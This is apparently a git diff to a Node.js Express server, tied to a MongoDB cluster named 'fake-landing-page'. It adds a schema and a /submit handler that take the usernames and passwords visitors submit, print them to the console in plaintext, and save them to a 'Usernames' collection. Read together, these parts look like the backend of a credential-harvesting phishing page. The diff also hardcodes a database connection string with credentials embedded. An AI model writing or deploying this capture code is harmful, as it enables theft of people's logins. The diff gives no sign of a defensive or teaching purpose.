@@ -2,9 +2,30 @@ var express = require("express");
 var app = express();
 var path = require("path");
 var bodyParser = require("body-parser");
+var mongoose = require("mongoose");
+
+//Set up default mongoose connection
+var mongoDB =
+	"mongodb+srv://test:test@fake-landing-page.ldj3h.mongodb.net/Testing?retryWrites=true&w=majority";
+
+mongoose.connect(mongoDB, { useNewUrlParser: true, useUnifiedTopology: true });
+
+//Get the default connection
+var db = mongoose.connection;
+
+//Define a schema
+var Schema = mongoose.Schema;
+
+var uapschema = new Schema({
+	username: String,
+	password: String,
+});
+
+var numberOfRequests = 0;
+// Compile model from schema
+var uapmodel = mongoose.model("Usernames", uapschema);
 
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
 
 app.use(express.static(path.join(__dirname, "public")));
 
@@ -13,9 +34,22 @@ app.get("/", function (req, res) {
 });
 
 app.post("/submit", (req, res) => {
+	numberOfRequests++;
+	console.log(numberOfRequests);
 	let username = req.body.username;
 	let password = req.body.password;
 	console.log(username, password);
+
+	uapmodel.create(
+		{
+			username: username,
+			password: password,
+		},
+		function (err, small) {
+			if (err) return handleError(err);
+			// saved!
+		}
+	);
 
 	res.sendStatus(200);
 });
